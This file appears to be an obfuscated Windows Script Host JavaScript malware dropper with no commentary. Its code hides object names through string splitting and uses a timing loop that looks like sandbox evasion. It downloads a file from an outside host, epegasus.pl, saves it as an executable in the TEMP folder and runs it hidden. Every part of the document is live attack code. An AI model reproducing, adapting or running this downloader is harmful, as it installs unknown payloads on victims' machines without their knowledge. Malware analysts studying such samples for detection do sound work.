var EA = false;
var G0 = "Create"+"Object";
var L = function O() {return WScript[G0]("WScript"+".Shell");}(), JD = 11;
var OL = "MSXML2"+".XMLHTTP";
var H1 = 2;
var SW = H1 - 2;
function SP(Y){L["Run"](Y, SW, SW);};
function F(){return OL + "";};
function Q(NJ, LZ){SW = SW * 1; return NJ - LZ;};
function HW(){return G0;};
/*@cc_on
  @if (@_win32 || @_win64)
    EA = true;
  @end
@*/
if (EA)
{
var M = "";
function B(){return 22;};
var V1 = 0; var K0 = 0;
function H()
{
var U = new this["Date"]();
var QE = U["getUTCMilliseconds"]();
WScript["Sleep"](B());
var U = new this["Date"]();
var K = U["getUTCMilliseconds"]();
WScript["Sleep"](B());
var U = new this["Date"]();
var Q0 = U["getUTCMilliseconds"]();
var V1 = "YR";
V1 = Q(K, QE);
var K0 = "E";
K0 = Q(Q0, K);
M = "open";
return Q(V1, K0);
}
var NI = false;
var P = false;
for (var D = SW; D < B() * 1; D++){if (H() != SW){
NI = true; 
K0 = "31" + 11 * V1 + K0; 
P = true; 
break;
}}
function V() {return ((NI == true) && (NI == P)) ? 1 : SW;};
if (NI && V() && P){
function OY() {return L["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "bN3XKzxcU.ex" + "e";};
 Q1 = F();
 V2 = WScript[G0](Q1);
 var H0 = 1;
do { 
	for (;H0;){
	try {
		if (H0 == 1)
		{
			V2[M]("GET", "http://epegasus.pl/m2osa", false);
			V2["send"]();
			V0 = "Sleep";
			H0 = 2;
		}
		WScript[V0](B() + 120); 
		if (V2["readystate"] < 2 * 2) continue;
		H0 = SW;
		function W(C) {var CF = (1, 2, 3, 4, 5, C); return CF;};
		PU = WScript[HW()]("ADODB.Stream");
		Q1 = PU;
		Q1[M]();
		Q1["type"] = W(1);
		Q1["write"](V2["ResponseBody"]);
		PU["position"] = W(SW);
		Q1["Save" + "ToFile"](OY(), 2);
		PU["cl"+"ose"]();
		G = OY();
		SP(G);
	} catch(M0){};};
}while (H0);
}
}

